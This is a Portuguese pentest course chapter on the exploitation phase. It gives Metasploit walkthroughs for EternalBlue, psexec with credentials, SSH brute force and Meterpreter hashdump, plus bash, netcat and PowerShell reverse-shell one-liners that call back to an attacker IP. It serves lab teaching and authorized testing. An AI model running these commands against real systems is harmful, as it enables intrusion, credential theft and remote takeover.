## FASE 5 — Exploração (Searchsploit, Metasploit, Payloads)

**Tempo estimado:** 60-120 minutos
**Objetivo:** Executar os exploits priorizados na Fase 2 e obter uma SESSÃO (shell) no alvo.
**Por quê:** Este é o passo que transforma "vulnerabilidade confirmada" em "eu tenho acesso". É o que o cliente/equipe quer ver funcionando.

> ⚠️ **Só explote vetores da `09-vetores/matriz-vetores.md` com prioridade 1 e escopo confirmado.** Explorar fora do escopo é crime, mesmo sabendo que a falha existe.

---

### Passo 5.1 — Escolher o exploit (da matriz da Fase 2)

**O que você vai fazer:** Abrir a matriz e pegar o vetor de prioridade 1 — CVE + exploit já identificados.

```bash
cat 09-vetores/matriz-vetores.md
cat 09-vetores/searchsploit-cves.txt
```

**✅ Output esperado (prioridade 1):**
```
| Samba 445 (10.0.0.1) | CVE-2017-0144 / ms17_010_eternalblue | Metasploit | 5 | [ ] |
```

**Antes de rodar, entenda o exploit:**
```bash
# Ver o código/descrição do exploit (se for do Exploit-DB)
searchsploit -x 42315

# Para exploits do Metasploit, veja dentro do próprio console:
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

**O que procurar no `info`:**
- **Rank:** `excellent` = confiável; `manual` = vai precisar adaptar
- **Check:** se tem `msf6 > check`, RODE `check` antes do `exploit` — ele confirma a vulnerabilidade SEM explorar
- **Targets/Payloads** compatíveis

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Matriz sem prioridade 1 | Sem CVE com exploit | Use credenciais das Fases 3/4 em módulos auxiliares (Passo 5.4) |
| Exploit é `.py` standalone | Não é Metasploit | Analise o código (Passo 5.5) |

---

### Passo 5.2 — Fluxo completo no msfconsole

**O que você vai fazer:** O ciclo de vida de TODO exploit no Metasploit — decore este fluxo:

```
1. msfconsole          → Abrir console
2. search <termo>      → Buscar exploit
3. use <exploit>       → Selecionar
4. show options        → Ver parâmetros OBRIGATÓRIOS (Yes na coluna "Required")
5. set <opção> <valor> → Preencher (RHOSTS, LHOST, credenciais)
6. check               → (se existir) confirmar vulnerabilidade sem explorar
7. show payloads       → Ver payloads compatíveis
8. set PAYLOAD <...>   → Escolher (reverse = volta para você)
9. exploit             → Executar
10. sessions           → Ver sessões abertas
```

```bash
# Iniciar
msfconsole
```

**✅ Output esperado (abertura — demora 30-60s):**
```
       =[ metasploit v6.3.44-dev                          ]
+ -- --=[ 2390 exploits - 1230 auxiliary                   ]
+ -- --=[ 413 payloads - 46 encoders - 11 nops             ]

msf6 >
```

---

### Passo 5.3 — Exemplo completo: MS17-010 (EternalBlue)

**O que você vai fazer:** Explorar a CVE-2017-0144 (Samba/Windows) que veio do `nmap-vuln.txt` do Módulo 01 — o exemplo clássico de recon → exploração.

```bash
# 1) Buscar
msf6 > search ms17-010
```

**✅ Output esperado:**
```
Matching Modules
================
  #  Name                                        Disclosure Date  Rank     Check  Description
  -  ----                                        ---------------  ----     -----  -----------
  0  exploit/windows/smb/ms17_010_eternalblue    2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
  1  auxiliary/scanner/smb/smb_ms17_010                           normal   Yes    MS17-010 Detection
```

```bash
# 2) PRIMEIRO verifique com o scanner (sem explorar!)
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.0.0.1
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

**✅ Output esperado (confirmou):**
```
[+] 10.0.0.1:445      - Host is likely VULNERABLE to MS17-010!
[-] 10.0.0.1:445      - Host is NOT vulnerable.
```

**Só continue se aparecer `VULNERABLE`.**

```bash
# 3) Selecionar o exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

# 4) Ver parâmetros
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

**✅ Output esperado:**
```
Module options:
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target host(s)
   RPORT      445              yes       The target port (TCP)

Payload options (windows/x64/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

```bash
# 5) Configurar — descubra SEU IP (LHOST) antes!
msf6 exploit(...) > set RHOSTS 10.0.0.1
RHOSTS => 10.0.0.1
msf6 exploit(...) > set LHOST 10.0.0.100    # SEU IP no lab (ip addr show)
LHOST => 10.0.0.100

# 6) Opcional: payloads alternativos
msf6 exploit(...) > show payloads
msf6 exploit(...) > set PAYLOAD windows/x64/shell/reverse_tcp   # sem Meterpreter, mais leve

# 7) Executar!
msf6 exploit(...) > exploit
```

**✅ Output esperado (sucesso):**
```
[*] Started reverse TCP handler on 10.0.0.100:4444
[*] 10.0.0.1:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.0.0.1:445 - Using named pipe: f4cc0b8c001beef1
[*] 10.0.0.1:445 - Target is vulnerable!
[*] 10.0.0.1:445 - Sending stage (200774 bytes) to 10.0.0.1
[*] Meterpreter session 1 opened (10.0.0.100:4444 -> 10.0.0.1:49152) at 2026-09-10 14:32:11 -0300

meterpreter >
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `Exploit aborted: No matching target` | OS não suportado pelo exploit | `show targets` — veja compatíveis |
| `Exploit completed, but no session was created` | Payload bloqueado/errado | Troque o payload (`shell/reverse_tcp`); tente `-j` jobs |
| `Connection refused (445)` | Porta fechada ou firewall | Confirme com `nmap -p 445 10.0.0.1` |
| `LHOST` inválido | IP da VPN errado | `ip addr show` — use o IP da interface da VPN/lab |
| Sessão caiu na hora | Antivírus/EDR | Documente como detectado; tente payload com encoder |
| Sem permissão | Precisa root para alguns módulos | `sudo -i` e rode o msfconsole como root |
| Msfconsole não abre | Instalação quebrada | `sudo apt install --reinstall metasploit-framework` |

---

### Passo 5.4 — Exploração usando credenciais (Fases 3 e 4)

**O que você vai fazer:** Se você achou senha no Hydra/cracking, muitos módulos do Metasploit aceitam credencial direto — sem precisar de CVE.

```bash
# === SMB com credencial encontrada (Fase 3) ===
msf6 > use exploit/windows/smb/psexec
msf6 exploit(...) > set RHOSTS 10.0.0.1
msf6 exploit(...) > set SMBUser administrator
msf6 exploit(...) > set SMBPass Admin@123      # senha do 10-bruteforce/credenciais-encontradas.md
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.0.0.100
msf6 exploit(...) > exploit

# === Brute force SSH via Metasploit (auxiliar) ===
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.0.0.1
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME admin
msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD_FILE /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/ssh/ssh_login) > run

# === MySQL/Web com credencial ===
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(...) > set RHOSTS 10.0.0.1
msf6 auxiliary(...) > set USERPASS_FILE /path/to/credenciais.txt
msf6 auxiliary(...) > run
```

**✅ Output esperado (auxiliar achou login):**
```
[+] 10.0.0.1:22 - SUCCESS: 'admin':'admin123'
[*] Command shell session 2 opened
```

**O que procurar:** `SUCCESS` = credencial confirmada; sessão aberta = acesso.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `psexec` falha com hash errado | Pass-the-hash vs senha | Use `SMBPass` com senha; para hash use `SMBPass` com `LM:NTLM` |
| Sem `USERPASS_FILE` | Formato | Gere: `sed 's/:/ /' credenciais.txt > userpass.txt` |

---

### Passo 5.5 — Interagir com a sessão (coletar evidência)

**O que você vai fazer:** A sessão aberta é só o começo — precisa CONFIRMAR e DOCUMENTAR o acesso com evidências.

```bash
# Listar sessões
msf6 > sessions

# Interagir com a sessão 1
msf6 > sessions -i 1

# Dentro do Meterpreter:
meterpreter > sysinfo
meterpreter > getuid
meterpreter > gethostname

# Evidências VALIOSAS para o relatório:
meterpreter > hashdump        # hashes do SAM (Windows)
meterpreter > screenshot      # tela
meterpreter > pwd             # diretório atual
meterpreter > ls              # arquivos

# Voltar ao console SEM matar a sessão (Ctrl+Z ou background)
meterpreter > background

# Ver sessões depois
msf6 > sessions -v
```

**✅ Output esperado:**
```
meterpreter > sysinfo
Computer        : DESKTOP-ABC123
OS              : Windows 7 (6.1.7601 Service Pack 1)
Architecture    : x64
System Language : pt-BR

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `getuid` = usuário comum | Precisa privesc | **Pare aqui se escopo não inclui privesc** (Fase 6); privesc é Módulo 04 |
| `hashdump` falha | Sem permissão | Precisa de SYSTEM/root — documente limitação |
| Sessão morreu | Instabilidade/EDR | `run` de novo; se repetir, documente detecção |

---

### Passo 5.6 — Alternativa: exploit standalone (Searchsploit)

**O que você vai fazer:** Quando não há módulo Metasploit, o Searchsploit traz scripts `.py`/`.c` — mas ANALISE antes de rodar.

```bash
# Copiar para a pasta da fase (nunca rode do diretório do Exploit-DB)
searchsploit -m 42315
mv 42315.py 12-exploracao/

# ANTES de rodar — leia o código!
nano 12-exploracao/42315.py
# Procure: IP hardcoded, payload suspeito, o que o script faz

# Ajuste o alvo (normalmente variáveis no topo ou argumentos)
python3 12-exploracao/42315.py 10.0.0.1
```

**✅ Output esperado:**
```
[*] target: 10.0.0.1:445
[*] ok: vulnerable
[*] sending payload...
[+] shell aberto em 10.0.0.100:4444
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `SyntaxError` Python 2/3 | Script antigo | `python2 script.py` ou adapte o código |
| Não funciona | Script para versão específica | Confirme a versão exata com `searchsploit -c <versão>` |
| **NUNCA rode script sem ler** | Risco de payload malicioso no próprio script | Leia linha a linha ou use só o Metasploit |

---

### Passo 5.7 — Backup: reverse shell manual (quando Metasploit falha)

**O que você vai fazer:** Se o exploit é outro (ex: upload de arquivo via web do Módulo 02), uma reverse shell clássica via netcat resolve.

```bash
# === NO SEU KALI (terminal 1) — escutar ===
nc -lvnp 4444
# Listening on 0.0.0.0 4444

# === NO ALVO (via form vulnerável do Módulo 02, ex: upload/RFI) ===
# Linux:
bash -i >& /dev/tcp/10.0.0.100/4444 0>&1
# Ou:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.100 4444 >/tmp/f

# Windows:
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.100',4444);..."
```

**✅ Output esperado (no seu Kali):**
```
connect to [10.0.0.100] from (UNKNOWN) 10.0.0.1 49152
$ whoami
evilcorp\www-data
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Nada conecta | Firewall de SAÍDA bloqueando | Reverse shell precisa de saída liberada; tente porta 443/80 |
| Conecta e cai | Shell não interativa | Use `script -qc /bin/bash /dev/null` ou python: `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
| Sem reverse (só bind) | Alvo atrás de NAT | Prefira sempre reverse |

---

### Checklist da Fase 5

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | Vetor escolhido da matriz | `09-vetores/matriz-vetores.md` atualizado | [ ] |
| 2 | Vulnerabilidade CONFIRMADA antes de explorar | `msf6 > check` ou scanner auxiliar | [ ] |
| 3 | Exploração executada (Metasploit ou standalone) | `12-exploracao/msf-logs.txt` | [ ] |
| 4 | Sessão aberta OU prova de falha documentada | `12-exploracao/sessao-1.txt` | [ ] |
| 5 | Evidências coletadas (sysinfo, getuid) | `12-exploracao/evidencias.md` | [ ] |
| 6 | Sessões gerenciadas (background/encerradas) | `sessions -v` | [ ] |

### 📁 Sua pasta deve estar assim ao final da Fase 5:

```
12-exploracao/
├── msf-logs.txt              ← transcript dos comandos e outputs do msfconsole
├── sessao-1.txt              ← sysinfo/getuid da sessão aberta
├── evidencias.md             ← evidências formatadas para o relatório
├── 42315.py                  ← exploits standalone copiados (se usados)
└── reverse-shell.log         ← log da reverse shell manual (se usada)
```

**Como salvar o log do Metasploit:**
```bash
# Dentro do msf6 (spool grava TUDO que você digita e o console imprime)
msf6 > spool 12-exploracao/msf-logs.txt
msf6 > ... (seus comandos)
msf6 > spool off
```

### ✅ Sinal de sucesso:
- **Meterpreter/shell aberta** e `sysinfo` + `getuid` salvos como evidência, OU
- **Prova documentada** de que o exploit não funciona neste alvo (versão errada, mitigação ativa)

### ❌ Se falhou:
- `no session created` → veja tabela de erros; teste payloads diferentes
- Todas as tentativas falharam → Fases 3 e 4 podem ter achado credenciais; documente o que tem
- Alvo totalmente protegido → **resultado válido**: "sem exploração possível com vetores em escopo"

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 5 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `evidencias.md` | Fase 6 | Confirmar impacto real (nível de acesso) |
| `evidencias.md` | Fase 7 | Seção principal do relatório |
| `sessao-1.txt` | Módulo 04 | Ponto de partida da pós-exploração (privesc, pivoting) |
| Hashdump (se feito) | Fase 4 (reuso) / Módulo 04 | Novos hashes para cracking |

**Se completou tudo → Avance para [Fase 6 — Validação](12-fase6-validacao.md)**
